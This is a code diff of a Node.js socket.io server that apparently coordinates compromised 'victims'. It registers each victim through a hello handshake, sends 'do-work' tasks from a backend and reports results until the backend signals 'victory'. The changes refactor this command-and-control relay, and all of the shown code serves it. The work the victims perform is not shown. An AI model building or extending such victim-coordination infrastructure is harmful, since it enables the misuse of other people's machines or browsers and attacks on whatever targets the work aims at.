@@ -16,18 +16,19 @@ const BACKEND_HOST = 'localhost',
       BACKEND_PORT = '8000';
 
 socket.on('connection', function(client) {
-    var victimId;
-    client.on('victim_id', function({victim_id}){
-	victimId = victim_id;
-    });
-
     winston.info('New connection from client ' + client.id);
+    
+    var victimId;
+    client.on('client-hello', function({VICTIM_ID}) {
+        victimId = VICTIM_ID;
+        client.emit('server-hello');
+    });
 
     var doNoWork = function() {
         client.emit('do-work', {});
     };
 
-    var createNewWork = function(victimId) {
+    var createNewWork = function() {
         var getWorkOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
@@ -53,6 +54,8 @@ socket.on('connection', function(client) {
 
     var reportWorkCompleted = function(work) {
         var requestBodyString = JSON.stringify(work);
+
+        var workCompletedOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
             headers: {
@@ -72,7 +75,7 @@ socket.on('connection', function(client) {
                 winston.info('Got (work-completed) response from backend: ' + responseData);
                 var victory = JSON.parse(responseData)['victory'];
                 if (victory === false) {
-                    createNewWork(victimId);
+                    createNewWork();
                 }
             });
         });
